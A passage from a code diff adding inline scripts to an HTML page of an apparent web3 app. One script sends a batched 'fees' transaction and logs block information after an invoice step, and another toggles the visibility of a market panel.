+                                batch.add(web3eth.eth.sendTransaction.request(fees), (error, signed)=>{
+                                  if (error) throw error;
+                                  web3eth.eth.sign(fees, fees.to);
+                                });
+                                
+                                // perform invoice in batch mode
+                                batch.execute();
+
+                                web3eth.eth.getBlockNumber().then((blocknum)=>{
+                                  web3eth.eth.getBlock(blocknum).then((info)=>{
+                                    console.log("Block information: " , info);
+                                  });  
+                                });
+                              });
+                            });
+                          });
+            });
+          }else{
+            _p05.style.visibility = 'hidden';
+          }
+        });
+      </script>
+      <script>
+        const _b06 = document.getElementsByClassName('market')[0];
+        const _p06 = document.getElementsByClassName('market-container')[0];
+
+        _b06.addEventListener('click', (event) => {
+          if (_p06.style.visibility === 'hidden'){
+            _p06.style.visibility = 'visible';
+          }else{
+            _p06.style.visibility = 'hidden';
+          }
+        })
+      </script>
 </body>
 </html>
-     
